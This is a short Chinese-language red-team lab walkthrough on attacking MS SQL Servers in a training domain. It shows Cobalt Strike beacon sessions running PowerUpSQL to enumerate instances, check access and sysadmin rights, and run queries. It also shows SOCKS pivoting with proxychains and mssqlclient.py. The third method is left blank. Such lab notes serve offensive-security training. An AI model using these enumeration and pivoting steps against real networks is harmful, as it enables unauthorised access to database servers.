# MS SQL Servers

引入powerupsql，枚举mssql实例

```
beacon> powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
[*] Tasked beacon to import: C:\Tools\PowerUpSQL\PowerUpSQL.ps1
[+] host called home, sent: 202920 bytes
beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 20 bytes
[*] You are DEV\bfarmer
beacon> powershell Get-SQLInstanceDomain
[*] Tasked beacon to run: Get-SQLInstanceDomain
[+] host called home, sent: 341 bytes
[+] received output:
#< CLIXML


ComputerName     : srv-1.dev.cyberbotic.io
Instance         : srv-1.dev.cyberbotic.io,1433
DomainAccountSid : 15000005210002361191261941702819312113313089172110400
DomainAccount    : svc_mssql
DomainAccountCn  : MS SQL Service
Service          : MSSQLSvc
Spn              : MSSQLSvc/srv-1.dev.cyberbotic.io:1433
LastLogon        : 5/3/2022 11:12 AM
Description      : 

```

有一个实例：```srv-1.dev.cyberbotic.io,1433```

根据实例查看当前session是否有进入权限

```
beacon> powershell Get-SQLConnectionTest -Instance "srv-1.dev.cyberbotic.io,1433" | fl
[*] Tasked beacon to run: Get-SQLConnectionTest -Instance "srv-1.dev.cyberbotic.io,1433" | fl
[+] host called home, sent: 461 bytes
[+] received output:
#< CLIXML


ComputerName : srv-1.dev.cyberbotic.io
Instance     : srv-1.dev.cyberbotic.io,1433
Status       : Accessible

```

显示Accessible，表明有权限


查看这个实例的更多信息
```
beacon> powershell Get-SQLServerInfo -Instance "srv-1.dev.cyberbotic.io,1433"
[*] Tasked beacon to run: Get-SQLServerInfo -Instance "srv-1.dev.cyberbotic.io,1433"
[+] host called home, sent: 437 bytes
[+] received output:
#< CLIXML


ComputerName           : srv-1.dev.cyberbotic.io
Instance               : SRV-1
DomainName             : DEV
ServiceProcessID       : 2744
ServiceName            : MSSQLSERVER
ServiceAccount         : DEV\svc_mssql
AuthenticationMode     : Windows Authentication
ForcedEncryption       : 0
Clustered              : No
SQLServerVersionNumber : 13.0.5026.0
SQLServerMajorVersion  : 2016
SQLServerEdition       : Standard Edition (64-bit)
SQLServerServicePack   : SP2
OSArchitecture         : X64
OsMachineType          : ServerNT
OSVersionName          : Windows Server 2016 Datacenter
OsVersionNumber        : SQL
Currentlogin           : DEV\bfarmer
IsSysadmin             : Yes
ActiveSessions         : 1

```

注意这两个字段,表明bfarmer对mssql有超级管理员权限
```
Currentlogin           : DEV\bfarmer
IsSysadmin             : Yes
```

## 利用

**方法1**
对这个实例进行sql语句查询

```
beacon> powershell Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select @@servername"
[*] Tasked beacon to run: Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select @@servername"
[+] host called home, sent: 501 bytes
[+] received output:
#< CLIXML

Column1
-------
SRV-1  
```


**方法二**

使用

先在wkstn-1上做一个pivot
```
socks 1080
```

再在kali上用mssqlclient.py登录mssql
```
proxychains python3 /usr/local/bin/mssqlclient.py -windows-auth DEV/bfarmer@10.10.17.25
```

1660780102416.png


**方法3**

